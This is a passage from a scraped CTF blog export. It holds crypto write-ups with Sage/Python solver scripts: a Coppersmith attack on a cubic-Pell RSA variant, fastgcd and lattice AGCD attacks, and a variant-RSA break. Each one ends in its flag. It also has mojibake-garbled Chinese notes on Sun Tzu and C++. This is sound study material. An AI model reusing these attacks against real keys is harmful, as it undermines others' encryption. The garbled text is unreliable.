3: for i in keys: fake ^= i else: for i in keys[:len(pub)//3]: fake ^= i print(len(keys)) print(keys) def recover_keystream(key, public): st = set(key) keystream = \u0026#39;\u0026#39; for v0, v1 in public: if v0 in st: keystream += \u0026#39;0\u0026#39; elif v1 in st: keystream += \u0026#39;1\u0026#39; else: assert False, \u0026#34;Failed to recover the keystream\u0026#34; return keystream stream = recover_keystream(keys, pub) print(strxor(long_to_bytes(int(stream, 2)), long_to_bytes(cipher))) # pbctf{super_duper_easy_brute_forcing_actually_this_one_was_made_by_mistake} Yet Another RSA # A varant RSA cryptosystem based on a cubic Pell\nHow the rsa implement by this strange formula(rcubic Pell) # Rules of ADD operation # solve # The left of the paper shows me the POC in theory,and\r@mystizshows the analysis result of data-range\n$0â€‹â‰¡k\\phi +1â‰¡k(p ^2 +p+1)(q ^2 +q+1)+1$\n$â‰¡k[n ^2 +n+1+(n+1)(p+q)+(p ^2 +q ^2)]+1(mod e)$\nThere are three unknown elements: $k \\approx d \\approx 2^{400}$, $p+q \\approx 2^{512}$ and $p^2 + q^2 \\approx 2^{1024}$ â€‹\nAnd $e\\approx 2^{2048}$,$2048\u0026gt;1024+512+400$\nwe can use coppersmith to attack it\n#! /usr/bin/sage from time import time from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * import itertools from tqdm import tqdm from rich.progress import track from rich.traceback import install install() from time import * p1 = time() # ----------------------------------- def add(P, Q, mod): m, n = P p, q = Q if p is None: return P if m is None: return Q if n is None and q is None: x = m * p % mod y = (m + p) % mod return (x, y) if n is None and q is not None: m, n, p, q = p, q, m, n if q is None: if (n + p) % mod != 0: x = (m * p + 2) * inverse(n + p, mod) % mod y = (m + n * p) * inverse(n + p, mod) % mod return (x, y) elif (m - n ** 2) % mod != 0: x = (m * p + 2) * inverse(m - n ** 2, mod) % mod return (x, None) else: return (None, None) else: if (m + p + n * q) % mod != 0: x = (m * p + (n + q) * 2) * inverse(m + p + n * q, mod) % mod y = (n * p + m * q + 2) * inverse(m + p + n * q, mod) % mod return (x, y) elif (n * p + m * q + 2) % mod != 0: x = (m * p + (n + q) * 2) * inverse(n * p + m * q + 2, mod) % mod return (x, None) else: return (None, None) def power_mul(P, a, mod): res = (None, None) t = P while a \u0026gt; 0: if a % 2: res = add(res, t, mod) t = add(t, t, mod) a \u0026gt;\u0026gt;= 1 return res def small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return [] N= int(144256630216944187431924086433849812983170198570608223980477643981288411926131676443308287340096924135462056948517281752227869929565308903867074862500573343002983355175153511114217974621808611898769986483079574834711126000758573854535492719555861644441486111787481991437034260519794550956436261351981910433997) e= int(3707368479220744733571726540750753259445405727899482801808488969163282955043784626015661045208791445735104324971078077159704483273669299425140997283764223932182226369662807288034870448194924788578324330400316512624353654098480234449948104235411615925382583281250119023549314211844514770152528313431629816760072652712779256593182979385499602121142246388146708842518881888087812525877628088241817693653010042696818501996803568328076434256134092327939489753162277188254738521227525878768762350427661065365503303990620895441197813594863830379759714354078526269966835756517333300191015795169546996325254857519128137848289) R = Integers(e) PR.\u0026lt;p_q, k\u0026gt; = PolynomialRing(R) f = k * (N**2 + N*p_q + p_q**2 - N + p_q + 1) + 1 bounds = (2**513, 2**400) print(\u0026#34;strating LLL\u0026#34;) p_q, k = small_roots(f, bounds, m=3, d=4)[0] p_q = 24061328198598730023892644418337616625129173971437927448877972244319015467758683782803490794256724311673381106878622466514439272631375460573992290498030162 k = 245962077700976781389651438762467784060458007726399012831680541230865888041508191613184353923990248850900264645309752826 print(p_q,k) E = 123436198430194873732325455542939262925442894550254585187959633871500308906724541691939878155254576256828668497797665133666948295292931357138084736429120687210965244607624309318401630252879390876690703745923686523066858970889657405936739693579856446294147129278925763917931193355009144768735837045099705643710, 47541273409968525787215157367345217799670962322365266620205138560673682435124261201490399745911107194221278578548027762350505803895402642361588218984675152068555850664489960683700557733290322575811666851008831807845676036420822212108895321189197516787046785751929952668898176501871898974249100844515501819117 PR.\u0026lt;x\u0026gt; = PolynomialRing(ZZ) f = x**2 - int(p_q) * x + N (p, _), (q, _) = f.roots() phi = (p ** 2 + p + 1) * (q ** 2 + q + 1) d = int(pow(e, -1, phi)) tmp = power_mul(E, d, N) flag1 = long_to_bytes(tmp[0])[:35].decode() flag2 = long_to_bytes(tmp[1])[:36].decode() print(flag1+flag2 ) # [(245962077700976781389651438762467784060458007726399012831680541230865888041508191613184353923990248850900264645309752826, 24061328198598730023892644418337616625129173971437927448877972244319015467758683782803490794256724311673381106878622466514439272631375460573992290498030162)] # pbctf{I_love_to_read_crypto_papers_and_implement_the_attacks_from_them} p2 = time() print(p2-p1) ","date":"18 October 2021","permalink":"/achieve/ctf/pbctf2021/","section":"archive","summary":"","title":"Personal document of cryptoChallenges for PBCTF2021"},{"content":"åœ¨æˆ˜ç•¥ä¸Šè¦è—è§†æ•Œäºº åœ¨æˆ˜æœ¯ä¸Šè¦é‡è§†æ•Œäºº\næˆ˜äº‰è®º # æˆ˜äº‰ä¸æ˜¯æ¶ˆé£ï¼Œä¸æ˜¯ä¸€ç§è¿½æ±‚å†’é™©å’ŒèµŒè¾“èµ¢çš„çº¯ç²¹çš„å¨±ä¹ï¼Œä¹Ÿä¸æ˜¯çµæœºä¸€åŠ¨çš„äº§ç‰©ï¼Œè€Œæ˜¯ä¸ºäº†è¾¾åˆ°ä¸¥è‚ƒçš„ç›®çš„è€Œé‡‡å–çš„ä¸¥è‚ƒçš„æ‰‹æ®µã€‚\nå±é™©ä¸­æœ€å¯è´µçš„ç²¾ç¥åŠ›é‡æ˜¯ä»€ä¹ˆï¼Ÿå‹‡æ°”\nå†›äº‰ # æ•…ä¸çŸ¥è«¸ä¾¯ä¹‹è¬€è€…ï¼Œä¸èƒ½è±«äº¤ï¹”ä¸çŸ¥å±±æ—ã€éšªé˜»ã€æ²®æ¾¤ä¹‹å½¢è€…ï¼Œä¸èƒ½è¡Œè»ï¹”ä¸ç”¨ é„‰å°è€…ï¼Œä¸èƒ½å¾—åœ°åˆ©ã€‚\næ•…å…µä»¥è©ç«‹ï¼Œä»¥åˆ©å‹•ï¼Œä»¥åˆ†å’Œç‚ºè®Šè€…ä¹Ÿã€‚\næ•…å…¶ç–¾å¦‚é¢¨ï¼Œå…¶å¾å¦‚æ—ï¼Œä¾µæ å¦‚ç«ï¼Œä¸å‹•å¦‚å±±ï¼Œé›£çŸ¥å¦‚é™°ï¼Œå‹•å¦‚é›·éœ‡ã€‚\næ é„‰åˆ†çœ¾ï¼Œå»“åœ°åˆ†å®ˆï¼Œæ‡¸æ¬Šè€Œå‹•ã€‚\nå…ˆçŸ¥è¿‚ç›´ä¹‹è¨ˆè€…å‹ï¼Œæ­¤è»çˆ­ä¹‹æ³•ä¹Ÿã€‚\næ•…ä¸‰è»å¯å¥ªæ°£ï¼Œå°‡è»å¯å¥ªå¿ƒã€‚æ˜¯æ•…æœæ°£éŠ³ï¼Œæ™æ°£æƒ°ï¼Œæš®æ°£æ­¸ã€‚æ•…å–„ç”¨å…µè€…ï¼Œé¿å…¶ éŠ³æ°£ï¼Œæ“Šå…¶æƒ°æ­¸ï¼Œæ­¤æ²»æ°£è€…ä¹Ÿã€‚ä»¥æ²»å¾…äº‚ï¼Œä»¥éœå¾…å˜©ï¼Œæ­¤æ²»å¿ƒè€…ä¹Ÿã€‚ä»¥è¿‘å¾…é ï¼Œ ä»¥ä½šå¾…å‹ï¼Œä»¥é£½å¾…é£¢ï¼Œæ­¤æ²»åŠ›è€…ä¹Ÿã€‚ç„¡é‚€æ­£æ­£ä¹‹æ——ï¼Œç„¡æ“Šå ‚å ‚ä¹‹é™£ï¼Œæ­¤æ²»è®Šè€…ä¹Ÿã€‚\næ•…ç”¨å…µä¹‹æ³•ï¼Œé«˜é™µå‹¿å‘ï¼ŒèƒŒä¸˜å‹¿é€†ï¼Œä½¯åŒ—å‹¿å¾ï¼ŒéŠ³å’å‹¿æ”»ï¼Œé¤Œå…µå‹¿é£Ÿï¼Œæ­¸å¸«å‹¿é ï¼Œåœå¸«éºé—•ï¼Œçª®å¯‡å‹¿è¿«ï¼Œæ­¤ç”¨å…µä¹‹æ³•ä¹Ÿã€‚\nåŠ¿ # æ¿€æ°´ä¹‹ç–¾,è‡³äºæ¼‚çŸ³è€…,åŠ¿ä¹Ÿ;é¸·é¸Ÿä¹‹ç–¾,è‡³äºæ¯æŠ˜è€…,èŠ‚ä¹Ÿã€‚æ˜¯æ•…å–„æˆ˜è€…,å…¶åŠ¿é™©,å…¶èŠ‚çŸ­ã€‚åŠ¿å¦‚å¼©,èŠ‚å¦‚å‘æœºã€‚\næ•…å–„æˆ˜è€…,æ±‚ä¹‹äºåŠ¿,ä¸è´£äºäºº,æ•…èƒ½æ‹©äººè€Œä»»åŠ¿ã€‚ä»»åŠ¿è€…,å…¶æˆ˜äººä¹Ÿ,å¦‚è½¬æœ¨çŸ³ã€‚ æœ¨çŸ³ä¹‹æ€§,å®‰åˆ™é™,å±åˆ™åŠ¨,æ–¹åˆ™æ­¢,åœ†åˆ™è¡Œã€‚æ•…å–„æˆ˜äººä¹‹åŠ¿,å¦‚è½¬åœ†çŸ³äºåƒä»ä¹‹å±±è€…,åŠ¿ä¹Ÿ\nå›ä¸»è®º # æ‰€æœ‰æ­¦è£…çš„å…ˆçŸ¥éƒ½è·å¾—èƒœåˆ©ï¼Œè€Œéæ­¦è£…çš„å…ˆçŸ¥éƒ½å¤±è´¥äº†\ncipher punk # å¼ºå¤§çš„å¯†ç æœ¯èƒ½å¤ŸæŠµæŠ—æ— é™æ–½åŠ çš„æš´åŠ›ã€‚ä»»ä½•æš´åŠ›éƒ½æ— æ³•è§£å†³ä¸€é“æ•°å­¦é—®é¢˜ã€‚\n","date":"30 September 2021","permalink":"/achieve/sentence/","section":"archive","summary":"","title":"drunk gibberish"},{"content":" èŠ±ä¸¤å¤©æ—¶é—´å¤ä¹ äº†ä¸€ä¸‹c\ngmp # GNU MPåº“æ˜¯ä¸€ä¸ªå¤§æ•´æ•°å’Œå¤šç²¾åº¦æµ®ç‚¹æ•°çš„è¿ç®—åº“ã€‚å®ƒæœ¬èº«æ˜¯ç”¨Cè¯­è¨€å†™æˆçš„ï¼Œä½†ä¹Ÿæä¾›äº†C++ç»‘å®šã€‚\nå½“ç”¨C++å†™ç¨‹åºæ—¶ï¼Œå¦‚æœä½ ä¸æ˜¯è‡ªè™ç‹‚æˆ–è€…ç‹‚çƒ­çš„æ‰‹åŠ¨ç¼–è¯‘å™¨å˜æ¢çˆ±å¥½è€…ï¼Œé‚£ä¹ˆç”¨C++ç»‘å®šæ¯«æ— ç–‘é—®æ˜¯æ›´å¥½çš„é€‰æ‹©ã€‚\nè¿™æ˜¯å› ä¸ºï¼ŒCè¯­è¨€ç‰ˆæœ¬çš„ç»‘å®šæŠŠæ‰€æœ‰æ“ä½œéƒ½å°è£…æˆäº†ç±»ä¼¼äºæ±‡ç¼–è¯­è¨€ä¸­çš„æŒ‡ä»¤ã€‚æ¯”å¦‚è¯´ï¼Œå¦‚æœè¦ç®—ä¸€ä¸ªå¤§æ•´æ•°ç‰ˆæœ¬çš„a+bï¼Œé‚£ä¹ˆåº”è¯¥è¿™ä¹ˆå†™ï¼š\nmpz_t a, b, c; mpz_init_set_ui(a, 1); mpz_init_set_ui(b, 2); mpz_add(c, a, b); mpz_clear(a); mpz_clear(b); mpz_clear(c); å…‰æ˜¯å®šä¹‰å˜é‡å’Œæ¸…ç†å†…å­˜å°±å·²ç»æŠŠå­©å­æ•´åäº†\nè¿™ç§æƒ…å†µçš„æ ¹æœ¬åŸå› æ˜¯ï¼ŒCè¯­è¨€ä¸­æ²¡æœ‰æ–¹ä¾¿çš„æ‰‹æ®µæ¥è¿›è¡Œå†…å­˜èµ„æºç®¡ç†å’Œå¿«é€Ÿç»“æ„æ„é€ \nå¯¼è‡´Cè¯­è¨€è™½ç„¶å¯ä»¥å®ç°è¡¨è¾¾å¼æ±‚å€¼æ¨¡å‹ï¼Œä½†æ— æ³•æ–¹ä¾¿åœ°å®ç°è‡ªå®šä¹‰ç±»å‹çš„è¡¨è¾¾å¼æ±‚å€¼æ¨¡å‹\nC++ç»‘å®šè¿™æ—¶å ªç§°æ•‘ä¸–ä¸»ï¼Œæå¤§åœ°å‡è½»äº†è¢«pythonæ¯’å®³çš„äººçš„æ€è€ƒè´Ÿæ‹…ï¼š\nconst mpz_class a {1}, b {2}; const auto c = a + b; è¿™æ®µä»£ç å¯ä»¥æ‰§è¡Œå’Œä¸Šé¢Cè¯­è¨€ä»£ç å®Œå…¨ç›¸åŒçš„è¡Œä¸º\nçœ‹äº†ä¸€çœ¼æºç ï¼Œåªèƒ½è¯´å­¦åˆ°å¾ˆå¤š\nè¿ç®—ç¬¦é‡è½½ï¼š\n// compound assignments __GMP_DECLARE_COMPOUND_OPERATOR(operator+=) __GMP_DECLARE_COMPOUND_OPERATOR(operator-=) __GMP_DECLARE_COMPOUND_OPERATOR(operator*=) __GMP_DECLARE_COMPOUND_OPERATOR(operator/=) __GMP_DECLARE_COMPOUND_OPERATOR_UI(operator\u0026lt;\u0026lt;=) __GMP_DECLARE_COMPOUND_OPERATOR_UI(operator\u0026gt;\u0026gt;=) __GMP_DECLARE_INCREMENT_OPERATOR(operator++) __GMP_DECLARE_INCREMENT_OPERATOR(operator--) å®ç°ä¸€ä¸ªpowï¼š\nå¯ä»¥çœ‹åˆ°å¯¹äºä¸€èˆ¬çš„è¿ç®—ç¬¦ç¼–å†™æ¥è¯´ï¼Œæˆ‘ä»¬ä¹ æƒ¯äºå»ç–¯ç‹‚åµŒå¥—ä¸€ä¸ªå…¬å¼å‡ºæ¥\nä½†gmpxxæ¶‰åŠåˆ°ä¸´æ—¶å˜é‡çš„åœ°æ–¹ï¼Œéœ€è¦æˆ‘ä»¬æ‰‹åŠ¨è®¾ç½®ä¸€ä¸ªä¸“ç”¨çš„ä¸´æ—¶å˜é‡ï¼ˆå’Œå…¶ä»–è¿ç®—ç¬¦é‡è½½çš„æ“ä½œæ˜¯ä¸€æ ·çš„ï¼‰\nmpz_class powerMod(mpz_class b, mpz_class n, mpz_class m) { mpz_class a {1}; int i; int k=0; mpz_class num = n; mpz_class tmp; while(num) { num = num\u0026gt;\u0026gt;1; ++k; } for(i=0; i\u0026lt;k; ++i) { tmp = n\u0026gt;\u0026gt;i; tmp = tmp \u0026amp;1; if(tmp == 1) a = a*b %m; b = b*b %m; } return a; } RAII # RAIIï¼Œä¹Ÿç§°ä¸ºâ€œèµ„æºè·å–å°±æ˜¯åˆå§‹åŒ–â€ï¼Œæ˜¯C++ç­‰ç¼–ç¨‹è¯­è¨€å¸¸ç”¨çš„ç®¡ç†èµ„æºã€é¿å…å†…å­˜æ³„éœ²çš„æ–¹æ³•ã€‚å®ƒä¿è¯åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œä½¿ç”¨å¯¹è±¡æ—¶å…ˆæ„é€ å¯¹è±¡ï¼Œæœ€åææ„å¯¹è±¡ã€‚\næ™ºèƒ½æŒ‡é’ˆï¼ˆstd::shared_ptrå’Œstd::unique_ptrï¼‰å³RAIIæœ€å…·ä»£è¡¨çš„å®ç°ï¼Œä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆï¼Œå¯ä»¥å®ç°è‡ªåŠ¨çš„å†…å­˜ç®¡ç†ï¼Œå†ä¹Ÿä¸éœ€è¦æ‹…å¿ƒå¿˜è®°deleteé€ æˆçš„å†…å­˜æ³„æ¼ã€‚\nä½†æ ¹æ®pwnğŸ‘´çš„æè¿°,è¿˜æ˜¯æœ‰æ´å¯ä»¥æ‰“,ä½†æ˜¯è¿™é¡¹æŠ€æœ¯æ‹”ğŸ‘´çš„å·¥ä½œé‡é™ä½äº†,è¿˜æ˜¯æ•´æŒºå¥½\nä¸cmakeæ–—æ™ºæ–—å‹‡ # ä¸€ä¸ªæ¨¡æ¿cmakelistï¼š\n# ç‰ˆæœ¬å· cmake_minimum_required(VERSION 3.0) PROJECT(Test) # è®¾ç½®å˜é‡ set(PROJECT_ROOT ${CMAKE_CURRENT_LIST_DIR}) message(\u0026#34;project dir:${PROJECT_ROOT}\u0026#34;) # å¤´æ–‡ä»¶ç›®å½• INCLUDE_DIRECTORIES(./include/) # INCLUDE_DIRECTORIES(/usr/local/include/) # è®¾ç½®æºç æ–‡ä»¶ä½ç½® AUX_SOURCE_DIRECTORY(./src/ DIR_SRCS) # è®¾ç½®ç¼–è¯‘å™¨ç‰ˆæœ¬ SET(CMAKE_CXX_STANDARD 11) # binæ–‡ä»¶ä½ç½® add_executable(test ${DIR_SRCS}) è¿è¡Œå®Œäº‹äº†å°±ä¼šæœ‰ä¸€ä¸ªç†Ÿæ‚‰çš„buildç›®å½•äº†\n","date":"27 September 2021","permalink":"/achieve/2019to2021/cpplearn/","section":"archive","summary":"","title":"A simple tour of C"},{"content":" ğŸ‘´ç¬¬äºŒæ¬¡æ‰“RCTFï¼Œå‘¨æœ«åˆæ¥è‹Ÿäº†ä¸ªæ°´é¢˜ï¼ŒğŸ‘´å¤ªæå§èœäº†ï¼Œå…¨é é˜Ÿå‹å¸¦\nuncommon1 # æ°”æ­»äº†æ°”æ­»äº†ï¼Œæ˜æ˜éƒ½å·²ç»æŠŠfastgcdä¿®å¥½äº†\næ‹¿ç€fastgcdæ—¥äº†åŠå¤©uncommon2ï¼Œä»¥ä¸ºæ²¡ç”¨ï¼Œç›´æ¥æ‰”æ‰äº†\næ·¦ï¼Œæ ¹æœ¬æ²¡è€ƒè™‘è¿‡ä¼šå‡ºç°åŒæ ·çš„ç´ æ•°ï¼Œå¤ªèœäº†ï¼Œæ˜æ˜ä¸Šè¯¾å­¦è¿‡çš„ğŸ˜€ğŸ˜€ğŸ˜€\nFastgcd # è¿™æ˜¯ä¸ªä»€ä¹ˆç©æ„å‘¢ï¼Ÿ\nä¼—æ‰€å‘¨çŸ¥GCDå¯ä»¥å¿«é€Ÿçš„ç®—å‡ºä¸¤ä¸ªæ•°æœ€å¤§å…¬çº¦æ•°ï¼Œä½†å¦‚æœæœ‰$N$ä¸ªæ•°æˆ‘å¯èƒ½è¦ç®—å¤§æ¦‚$N^2$æ¬¡\näºæ˜¯ä¸€ç¾¤æ•°å­¦å®¶æƒ³ï¼šèƒ½ä¸èƒ½æ¦‚ä¸€ä¸ªç®—æ³•å§å®ƒçš„å¤æ‚åº¦é™ä½ä¸€ç‚¹ï¼Ÿ\nå¤§æ¦‚æµç¨‹å¦‚ä¸‹\nç”Ÿæˆæ ‘è¿™ç§æ¦‚å¿µå·²ç»å¤ªä¹…è¿œäº†ï¼ŒğŸ‘´è®°ä¸æ¸…äº†\næˆ–è€…é•¿è¿™æ ·ï¼š\nuç¥ä¸çŸ¥åœ¨é‚£ç¯‡æ–‡ç« æ‰¾åˆ°çš„å®ç°æµç¨‹ï¼š\næ–‡ç« è¯´å¤æ‚åº¦ä¸º$O(N(lgN)^2lg(lgN))$\nå’Œ$N^2$ç›¸æ¯”å°±å¾ˆèˆ’æœäº†\nimplement # uç¥çš„è¯æ˜ï¼š\nå®Œå…¨æ²¡æƒ³åˆ°è¿™ä¸€å±‚ï¼Œä¸Šå­¦æœŸè¿˜å­¦è¿‡ï¼Œå¤ªæ‘†äº†\nfastgcdå®ç°ï¼š\nä½ è®©ğŸ‘´å®ç°è¿™ç©æ„ğŸ‘´è‚¯å®šæ˜¯ä¼šå½“åœºæ‘†çƒ‚çš„ï¼Œæ‰€ä»¥ğŸ‘´æ‰¾åˆ°äº†ç°æˆçš„ä»“åº“\nhttps://github.com/sagi/fastgcd\næ‹–ä¸‹æ¥å‘ç°ä¸èƒ½ç«‹é©¬intsallï¼Œäºæ˜¯æˆ‘ä»¬æ¥ç€æ‰‹ä¿®install\n#!/bin/bash __exists() { which $1 1\u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } get=\u0026#34;fetch\u0026#34;; ! __exists fetch \u0026amp;\u0026amp; get=\u0026#34;curl -OL\u0026#34;; if [ ! -d gmp-5.0.5 ]; then if [ ! -f gmp-5.0.5.tar.bz2 ]; then $get ftp://ftp.gmplib.org/pub/gmp-5.0.5/gmp-5.0.5.tar.bz2 fi sum=`openssl sha1 gmp-5.0.5.tar.bz2 | awk -F\u0026#39; \u0026#39; \u0026#39;{print $2}\u0026#39;` if [[ $sum != \u0026#34;12a662456033e21aed3e318aef4177f4000afe3b\u0026#34; ]]; then echo \u0026#39;\u0026#39; echo \u0026#39;==========================================\u0026#39; echo \u0026#39;ERROR: could not verify gmp-5.0.5.tar.bz2;\u0026#39; echo \u0026#39;Downloaded over untrusted channel (non-https)\u0026#39; echo \u0026#39;==========================================\u0026#39; exit; fi tar xf gmp-5.0.5.tar.bz2 fi cd gmp-5.0.5 patch -p 1 \u0026lt; ../gmp-5.0.5.patch mkdir ../gmp-patched ./configure --prefix=$PWD/../gmp-patched/ make make install cd .. make æ˜¾ç„¶æ˜¯$get ftp://ftp.gmplib.org/pub/gmp-5.0.5/gmp-5.0.5.tar.bz2å‡ºäº†é—®é¢˜ï¼ˆåæ­£æˆ‘ä¸‹è½½ä¸ä¸‹æ¥ï¼‰\näºæ˜¯ä¸Šgmpå®˜ç½‘æ‰‹åŠ¨ä¸‹ä¸€ä¸ª\nä¿®æ”¹install.shï¼Œä¿®æ”¹æºç æŠ¥é”™çš„é¢„ç¼–è¯‘ä»£ç \nfastgcd.c\n#define NTHREADS 4 // Get from compile-time argument? // #ifdef mpz_raw_64 // if patched gmp, use large format int i/o // #define __mpz_inp_raw mpz_inp_raw_64 // #define __mpz_out_raw mpz_out_raw_64 // #else // otherwise use normal i/o...beware 2^31 byte size limit #define __mpz_inp_raw mpz_inp_raw #define __mpz_out_raw mpz_out_raw // #endif install.sh\ntar xf gmp-5.0.5.tar.bz2 cd gmp-5.0.5 patch -p 1 \u0026lt; ../gmp-5.0.5.patch mkdir ../gmp-patched ./configure --prefix=$PWD/../gmp-patched/ make make install cd .. make ç›´æ¥installç¼–è¯‘\næå–æ•°æ®ä¸ºinput.modleçš„æ ¼å¼\nfrom Crypto.Util.number import * from tqdm import size = 2**22 with open(\u0026#34;lN.bin\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() f1 = open(\u0026#34;data\u0026#34;,\u0026#34;w+\u0026#34;) for i in tqdm(range(size)): tmp = hex(bytes_to_long(data[i*64:(i+1)*64]))[2:] f1.write(tmp+\u0026#39;\\n\u0026#39;) å¼€è·‘~~\nç»“æœï¼š\næ¯”uç¥å¤šèŠ±äº†5åˆ†é’Ÿï¼Œè¿˜æ˜¯æœºå­ä¸å¤ªè¡ŒğŸ¨ğŸ¨ğŸ¨\nsolve # In [2]: s=0x7f2ec3455a5f6763645f5472333333333333338a2068398023 ...: In [3]: from Crypto.Util.number import * In [4]: long_to_bytes(s) Out[4]: b\u0026#39;\\x7f.\\xc3EZ_gcd_Tr3333333\\x8a h9\\x80#\u0026#39; In [5]: uncommon2 # A AGCD problemï¼Œusing lattice reduce is simple to solve it\nAGCD # $n_i=p*q_i+r_i$å½¢å¼çš„AGCDé—®é¢˜ï¼Œåˆ©ç”¨æ ¼è§„çº¦æ˜¯å¯è§£çš„\nğŸ‘´çœ‹åˆ°å¾ˆå¤šæ–‡ç« éƒ½æœ‰æ‰“æ³•ä»‹ç»ï¼Œä½†æ˜¯åªæœ‰è¿™ç¯‡ä»‹ç»äº†æ ¼å­çš„ç»“æ„ï¼ˆ\nhttps://martinralbrecht.wordpress.com/2020/03/21/the-approximate-gcd-problem/\nä¸€æŠŠæ¢­å“ˆå°±èƒ½è§£uncommon2\nsolve # #! /usr/bin/sage from sage.all import * from sage.groups.generic import bsgs from Crypto.Util.number import * from Crypto.Util.number import * with open(\u0026#34;lN.bin\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() f1 = open(\u0026#34;./data\u0026#34;,\u0026#34;wb\u0026#34;) size = 128 print(\u0026#39;size\u0026#39;,size) nn=[] for i in range(size): nn.append((bytes_to_long(data[i*64:(i+1)*64]))) B = [[0 for i in range(size)] for _ in range(size)] x0 = nn[0] B[0][0]=2^305 for i in range(1,size): B[0][i]=nn[i] # B[0][i]=i # print(B) # print(x0) print(\u0026#39;start LLL....\u0026#39;) for i in range(1,size): B[i][i]=-x0 B = Matrix(B) V = B.LLL() q = abs(V[0][0]) q = q\u0026gt;\u0026gt;305 print(x0-q) p = x0//q print(long_to_bytes(p)) # flag{Simpl3_LLL_TrIck} attachment # https://github.com/ljahum/crypto-challenges/tree/main/RCTF2021 refer # https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final228.pdf\nhttps://cr.yp.to/lineartime/multapps-20080503.pdf\nhttps://github.com/sagi/fastgcd\n","date":"14 September 2021","permalink":"/achieve/ctf/rctf2021/","section":"archive","summary":"","title":"Writeup for crypto in RCTF 2021"},{"content":"\rå…»æˆæ¯2021 # æ²¡æœ‰æŠ¥ äº‹åçœ‹äº†ä¸€ä¸‹é™„ä»¶\nå¯†ç é¢˜è´¨é‡æŒºæ°´çš„,åªæœ‰ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„é¢˜\nRSA? # è¿™é“é¢˜æ‹¿åˆ°å°±æ˜¯ä¸€ä¸ªsageæ–‡ä»¶ï¼Œç»™äº†åŠ å¯†çš„é€»è¾‘\nimport os from Crypto.Util.number import * flag = \u0026#34;GWHT{xxxxxxxxx}\u0026#34; p = getPrime(256) q = getPrime(256) n = p*q N = (p-1)*(q-1) e = 65537 Mx = bytes_to_long(os.urandom(30)) My = bytes_to_long(flag) Z1 = (Mx*My)%n inv_Z1 = inverse_mod(Z1, n) inv_2 = inverse_mod(2, n) X = ((Z1+inv_Z1)*inv_2)%n Y = My inv_Y = inverse_mod(Y, n) a = ((inv_Z1-X)*inv_Y)%n D = (a*a)%n xy = lambda (x1,y1),(x2,y2) : ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n) def getloop((x,y), e): ret = (x, y) for i in range(e-1): ret = xy(ret, (x,y)) return ret print n print getloop((X, Y), e) print a # 13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023 # (5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110, 2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785) # 1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141 ç¨å¾®åˆ†æä¸€ä¸‹æœ‰ä»¥ä¸‹å¼å­:\n$X=\\frac{1+M_x^2M_y^2}{2M_xM_y}$\n$Y=M_y$\n$a=\\frac{1-M_x^2M_y^2}{2M_xM_y^2}$\n$D=\\frac{(1-M_x^2M_y^2)^2}{4M_x^2M_y^4}$\nå¯¹getloopç¨å¾®åˆ†æä¸€ä¸‹å¯ä»¥å‘ç°\nn=0æ—¶\n$X_0=\\frac{1+M_x^2M_y^2}{2M_xM_y}$\n$Y_0=M_y$\nn=1æ—¶\n$X_1=\\frac{1+M_x^4M_y^4}{2M_x^2M_y^2}$\n$Y_1=\\frac{1+M_x^2M_y^2}{M_x}$\nåˆæœ‰\n$Y_1a=\\frac{1-M_x^4M_y^4}{2M_x^2M_y^2}$\nåˆ™\n$X_1-Y_1a=\\frac{2M_x^4M_y^4}{2M_x^2M_y^2}=M_x^2M_y^2$\nåŒç†\n$X_0-Y_0a=\\frac{2M_x^2M_y^2}{2M_xM_y}=M_xM_y$\nç›¸å½“äºåœ¨\ndef getloop((x,y), e): ret = (x, y) for i in range(e-1): ret = xy(ret, (x,y)) return ret ä¸­\næ¯æ¬¡å¾ªç¯åéƒ½ä¼šä¹˜ä¸Š$M_yM_x$\nåˆ™è§£ä¸€ä¸ªrsaå°±å®Œäº‹äº†\nåœ¨è¿™ä¸ªèŠ‚éª¨ç‚¹ä¸ŠğŸ‘´æ˜¯ä¸‡ä¸‡æ²¡æƒ³åˆ°ä¸€ä¸ªyafuå°±èƒ½æŠŠnåˆ†è§£å¼€ã€‚ã€‚ã€‚\nsolve\nimport libnum, gmpy2 n = 13390709926509813526471364597371124446888078365567927211781799241724742352679484983709219580483800891886832613684875066109177882219522305348565532970795023 p = 115718235064789220654263009993128325569382592506655305434488398268608329541037 q = n//p e = 65537 Xn, Yn = 5404548088049249951619519701935576492239293254135836357417714329205323074367876875480850741613547220698045360461761929952847796420174204143917852624050110, 2110372753170830610718226848526649992911771424441223687775304654852191999130502986109306355582366065947895295520226816523397652918227241733632791793362785 a = 1762039418842677123086894939949574689744108610561557889235294034870342076452734215004689409493802437034960516295735815195656138656970901855976802991519141 c = (Xn - Yn * a)%n d = gmpy2.invert(e,(p-1)*(q-1)) xy = pow(c,d,n) flag = ((1-xy*xy)*gmpy2.invert(2,n)*gmpy2.invert(xy,n)*gmpy2.invert(a,n))%n print(libnum.n2s(flag)) 